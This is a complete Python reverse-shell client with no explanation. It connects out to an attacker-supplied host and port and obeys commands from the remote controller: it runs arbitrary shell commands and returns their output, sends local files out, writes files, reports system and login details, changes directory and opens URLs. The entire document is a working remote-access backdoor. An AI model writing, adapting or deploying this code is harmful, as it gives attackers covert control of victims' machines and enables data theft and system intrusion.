import socket
import subprocess
from sys import argv
import os
from platform import platform, system, version, machine
import webbrowser

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((argv [1], int (argv [2])))

while True:
    
    dt = s.recv (1024)
    
    if dt == 'quit':
        s.close ()
        break
    elif dt.split (':')[0] == 'dload':
        try:
            text_for_send = ''
            f = open (dt.split (':')[1], 'r')
            for i in f:
                text_for_send += i
            s.sendall ('dl:' + text_for_send)
            f.close ()
        except:
            s.send ('error')
    elif dt == 'revers':
        s.send (' ')
    elif dt.split (':')[0] == 'uload':
        content_to_load = dt.split (':')[0:]
        s.send ('tit')
        file_p = s.recv (1024)
        if file_p != '':
            f = open (file_p, 'w')
            f.write (content_to_load)
            f.close ()
            s.send ('suc')
    elif dt == 'getos':
        os_info = '''
            
        
            Platform: ''' + platform () + '''                   
            System: ''' + system () + '''                       
            Version: ''' + version () + '''                      
            Machine: ''' + machine () + '''
            Login: ''' + os.getlogin () + '''
            Current Working Directory: ''' + os.getcwd () + '''                     
                                                                    
    
        '''
        
        s.send (os_info)
        
    elif dt.split (':')[0] == 'chdir':
        os.chdir(dt.split (':')[1])
    elif dt.split (':')[0] == 'wopen':
        webbrowser.open (dt.split (':')[1])
        s.send ('WebBrowser opened!')
    else:
        proc = subprocess.Popen (dt, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        out = proc.stdout.read () + proc.stderr.read ()
        if out.strip (' ') != '':
            s.send (out)
        else:
            s.send ('Command executed!')
